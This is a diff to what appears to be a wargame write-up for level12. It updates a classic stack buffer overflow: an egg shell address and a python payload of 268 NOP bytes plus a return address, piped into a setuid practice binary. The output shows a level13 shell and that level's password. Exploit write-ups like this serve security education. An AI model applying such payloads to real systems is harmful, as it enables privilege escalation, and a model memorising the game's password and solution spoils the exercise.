@@ -190,12 +190,18 @@ main() {
 Using address: 0xbfffe8b8
 
 sh-2.05b$ ./getegg
-EGG : 0xbffff69c
+EGG : 0xbffff6d4
 
-sh-2.05b$ (perl -e 'print "A"x268,"\x9c\xf6\xff\xbf"';cat) | /home/level12/attackme
+sh-2.05b$ (python -c 'print"\x90"*268+"\xd4\xf6\xff\xbf"';cat) | /home/level12/attackme
+
+id
+uid=3093(level13) gid=3092(level12) groups=3092(level12)
+
+my-pass
+Level13 Password is "have no clue".
 ```
 
-0xbffff69c   
-bf ff f6 9c   
-9c f6 ff bf   
-\x9c\xf6\xff\xbf
+0xbffff6d4   
+bf ff f6 d4      
+d4 f6 ff bf   
+\xd4\xf6\xff\xbf
